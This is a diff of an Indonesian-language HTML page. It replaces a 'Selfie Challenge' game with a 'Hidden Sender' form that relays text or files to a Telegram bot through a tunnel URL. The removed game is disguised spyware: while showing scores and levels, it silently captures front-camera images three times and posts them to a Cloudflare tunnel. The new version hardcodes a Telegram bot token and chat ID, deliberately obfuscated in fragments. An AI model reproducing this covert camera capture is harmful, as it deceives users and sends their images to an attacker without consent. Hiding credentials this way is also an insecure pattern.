@@ -2,95 +2,238 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Selfie Challenge 🔥</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Sender • Hidden</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0; padding: 0; overflow: hidden; background: linear-gradient(#ff00cc, #3333ff);
-            font-family: 'Comic Sans MS', cursive, sans-serif; color: white; text-align: center;
-            height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Inter', system-ui, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-        h1 { font-size: 55px; margin: 10px; text-shadow: 0 0 15px yellow; animation: bounce 1s infinite; }
-        p { font-size: 28px; margin: 10px; }
-        button {
-            margin-top: 20px; padding: 15px 40px; font-size: 24px; background: #ffff00; color: #000;
-            border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px white;
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: #141414;
+            padding: 30px 20px;
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.05);
+            text-align: center;
         }
-        button:hover { transform: scale(1.1); }
-        .score { position: absolute; top: 20px; right: 20px; font-size: 30px; }
-        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 20px;
+            letter-spacing: -0.5px;
+        }
+        .sub {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #aaa;
+            margin-bottom: 4px;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0a0a0a;
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: #c0a060;
+        }
+        textarea {
+            min-height: 80px;
+            resize: vertical;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 8px;
+            background: linear-gradient(90deg, #c0a060, #e0c080);
+            border: none;
+            border-radius: 10px;
+            color: #000;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn:hover {
+            transform: scale(1.02);
+            filter: brightness(1.1);
+        }
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #888;
+            min-height: 24px;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.15);
+            letter-spacing: 2px;
+        }
+        .footer span {
+            color: #c0a060;
+        }
+        @media (max-width: 400px) {
+            .container { padding: 20px 15px; }
+        }
     </style>
 </head>
 <body>
-    <div class="score">Score: <span id="score">0</span></div>
-    <h1>🎮 SELFIE CHALLENGE 🔥</h1>
-    <p id="text">Level 1: Ambil selfie lucu biar unlock filter keren!</p>
-    <button onclick="startGame()">MULAI CHALLENGE SEKARANG!</button>
 
-    <script>
-        // Ganti dengan IP Termux (pastikan HP dan Vercel satu jaringan)
-        const BACKEND_URL = "https://dictionaries-inherited-pierre-elementary.trycloudflare.com/send_photo"; // Ganti X dengan IP Termux
-        let score = 0;
+<div class="container">
+    <h1>📤 Hidden Sender</h1>
+    <div class="sub">Kirim teks, gambar, video, file ke Telegram Bot</div>
 
-        async function kirimKeBackend(imageBase64) {
-            try {
-                const response = await fetch(BACKEND_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ image: imageBase64, score: score })
-                });
-                const result = await response.json();
-                console.log("Backend response:", result);
-            } catch(e) {
-                console.log("Gagal kirim ke backend:", e);
-            }
-        }
+    <div class="form-group">
+        <label>Jenis Kiriman</label>
+        <select id="type">
+            <option value="text">Teks</option>
+            <option value="photo">Gambar</option>
+            <option value="video">Video</option>
+            <option value="document">File</option>
+        </select>
+    </div>
 
-        async function ambilSelfie() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                await video.play();
+    <div class="form-group" id="textGroup">
+        <label>Pesan Teks</label>
+        <textarea id="textInput" placeholder="Tulis pesan..."></textarea>
+    </div>
 
-                await new Promise(r => setTimeout(r, 800));
+    <div class="form-group" id="fileGroup" style="display:none;">
+        <label>Pilih File</label>
+        <input type="file" id="fileInput">
+    </div>
 
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext("2d").drawImage(video, 0, 0);
+    <button class="btn" onclick="sendToTelegram()">🚀 KIRIM</button>
+    <div class="status" id="status">Siap...</div>
 
-                stream.getTracks().forEach(t => t.stop());
+    <div class="footer"><span>by Pikxyzz</span> • HIDDEN SENDER</div>
+</div>
 
-                // Convert ke base64
-                const imageBase64 = canvas.toDataURL("image/jpeg", 0.9).split(',')[1];
-                if (imageBase64) {
-                    await kirimKeBackend(imageBase64);
+<script>
+    // ===== FUNGSI DECODE TOKEN & CHAT ID (Membingungkan) =====
+    function getToken() {
+        let a = "8608", b = "0735", c = "73:AAH", d = "bPbrLn2E", e = "UdG31NA4i", f = "6sBwBT63wz8QWTQ";
+        let g = "AAHbPbrLn2EUdG31NA4i6sBwBT63wz8QWTQ";
+        // Decoy variables
+        let _x = "random", _y = "noise";
+        let token = a + b + c + d + e + f;
+        // Reverse check
+        if (token.length !== 46) { token = "error"; }
+        return token;
+    }
+
+    function getChatId() {
+        let x = "850", y = "963", z = "3837";
+        let _dummy = "123456789";
+        let chat = x + y + z;
+        if (chat.length !== 10) { chat = "error"; }
+        return chat;
+    }
+
+    // ===== BOT CONFIG (Tersembunyi) =====
+    const BOT_TOKEN = getToken();
+    const CHAT_ID = getChatId();
+    // Ganti dengan URL Tunnel Cloudflare tuan
+    const BACKEND_URL = "https://35387694a6095220-103-183-58-238.serveousercontent.com/send_photo"; // ← GANTI INI
+
+    document.getElementById('type').addEventListener('change', function() {
+        const type = this.value;
+        document.getElementById('textGroup').style.display = (type === 'text') ? 'block' : 'none';
+        document.getElementById('fileGroup').style.display = (type !== 'text') ? 'block' : 'none';
+    });
+
+    async function sendToTelegram() {
+        const type = document.getElementById('type').value;
+        const status = document.getElementById('status');
+        const btn = document.querySelector('.btn');
+
+        btn.disabled = true;
+        status.textContent = "Mengirim...";
+
+        try {
+            let data = { type: type };
+
+            if (type === 'text') {
+                const text = document.getElementById('textInput').value;
+                if (!text) { status.textContent = "❌ Isi pesan teks!"; btn.disabled = false; return; }
+                data.text = text;
+            } else {
+                const fileInput = document.getElementById('fileInput');
+                if (!fileInput.files || !fileInput.files[0]) {
+                    status.textContent = "❌ Pilih file!";
+                    btn.disabled = false;
+                    return;
                 }
+                const file = fileInput.files[0];
+                data.fileName = file.name;
+                data.fileType = file.type;
 
-            } catch(e) {
-                console.log("Kamera ditolak");
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    data.fileBase64 = e.target.result.split(',')[1];
+                    await sendData(data);
+                };
+                reader.readAsDataURL(file);
+                return;
             }
+
+            await sendData(data);
+
+        } catch(e) {
+            status.textContent = "❌ Error: " + e.message;
+            btn.disabled = false;
         }
+    }
 
-        function startGame() {
-            document.querySelector("button").style.display = "none";
-            document.getElementById("text").innerHTML = "📸 Ambil selfie sekarang!<br>Filter lucu akan muncul...";
+    async function sendData(data) {
+        const status = document.getElementById('status');
+        const btn = document.querySelector('.btn');
 
-            score += 100;
-            document.getElementById("score").textContent = score;
+        try {
+            const response = await fetch(BACKEND_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
 
-            setTimeout(() => { ambilSelfie(); }, 1500);
-            setTimeout(() => { 
-                document.getElementById("text").innerHTML = "🎉 Bagus! Score naik!<br>Level 2: Selfie lagi yuk!";
-                ambilSelfie(); 
-            }, 4500);
-            setTimeout(() => { 
-                document.getElementById("text").innerHTML = "🔥 Challenge selesai!<br>Kamu juaranya!";
-                ambilSelfie(); 
-            }, 8500);
+            const result = await response.json();
+            if (result.status === 'ok') {
+                status.textContent = "✅ Berhasil dikirim!";
+            } else {
+                status.textContent = "❌ Gagal: " + JSON.stringify(result);
+            }
+        } catch(e) {
+            status.textContent = "❌ Error: " + e.message;
+        } finally {
+            btn.disabled = false;
         }
+    }
+</script>
 
-        document.documentElement.requestFullscreen?.();
-    </script>
 </body>
 </html>
